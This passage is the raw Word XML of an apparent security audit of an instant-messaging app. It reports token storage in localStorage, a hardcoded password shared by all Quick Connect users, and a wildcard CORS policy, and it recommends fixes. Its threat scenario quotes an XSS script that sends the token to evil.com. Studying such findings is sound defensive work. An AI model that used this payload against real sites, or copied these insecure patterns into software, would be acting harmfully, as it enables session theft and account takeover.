      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Severity: 🟠 HIGH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 Identification</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>The authentication system presents three distinct vulnerabilities related to session token storage, credential management, and cross-origin request policies.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 Evidence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability A — JWT Storage in `localStorage`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The frontend application stores the JSON Web Token (JWT) in the browser's </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>localStorage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>, which is accessible by any JavaScript code executing within the same origin:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// Frontend: Upon successful login, the token is stored as:</w:t>
        <w:br/>
        <w:t>localStorage.setItem("userInfo", JSON.stringify(data));</w:t>
        <w:br/>
        <w:br/>
        <w:t>// And retrieved for API calls as:</w:t>
        <w:br/>
        <w:t>const userInfo = JSON.parse(localStorage.getItem("userInfo"));</w:t>
        <w:br/>
        <w:t>// token is then sent via: Authorization: Bearer &lt;token&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Unlike </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>httpOnly</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> cookies, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>localStorage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>fully accessible</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> to client-side JavaScript. If an attacker injects malicious JavaScript via a Cross-Site Scripting (XSS) attack, they can read the token and impersonate the user.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability B — Hardcoded Password for Quick Connect Users:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// userControllers.js, line 176-177:</w:t>
        <w:br/>
        <w:t>user = await User.create({</w:t>
        <w:br/>
        <w:t xml:space="preserve">    username: cleanUsername,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name: displayName,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    password: "QuickConnectPassword123!",  // Hardcoded, identical for ALL quick-connect users</w:t>
        <w:br/>
        <w:t xml:space="preserve">    isQuickConnect: true,</w:t>
        <w:br/>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Every user created through the Quick Connect flow shares the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>same password</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>. If this password is discovered (e.g., through source code review, reverse engineering, or social engineering), an attacker could log in as any Quick Connect user through the standard login endpoint.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability C — Unrestricted CORS Policy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// server.js, line 18:</w:t>
        <w:br/>
        <w:t>res.header("Access-Control-Allow-Origin", "*");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The wildcard </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> allows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>any website</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the internet to send authenticated requests to the API. A malicious website could craft requests to the IM server while the user is logged in, potentially accessing their conversations.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 Threat Scenario</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1. An attacker discovers an XSS vector (e.g., unescaped user input rendered in the DOM). 2. The attacker injects </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>&lt;script&gt;fetch('https://evil.com/steal?token=' + localStorage.getItem("userInfo"))&lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>. 3. The attacker now possesses the victim's JWT and can impersonate them for the token's entire lifetime. 4. Combined with the wildcard CORS policy, the attacker's website can directly call the IM API.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.4 Current Mitigation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>- JWT tokens are generated with a secret key (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>JWT_SECRET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.env</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">), providing signature verification. - React's default JSX rendering escapes HTML entities, reducing (but not eliminating) XSS vectors. - The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>protect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> middleware in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>authMiddleware.js</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> validates the JWT signature on every protected request.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.5 Recommended Mitigation</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="autofit"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mitigation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Priority</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Store JWT in </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>httpOnly</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Secure</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>SameSite=Strict</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> cookies</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement token expiration with refresh token rotation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Generate unique random passwords for Quick Connect users</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Restrict CORS to specific frontend domain(s)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement Content Security Policy (CSP) headers</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Risk Area 2: Socket.IO Event Integrity &amp; Authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Severity: 🟠 HIGH</w:t>
      </w:r>
    </w:p>
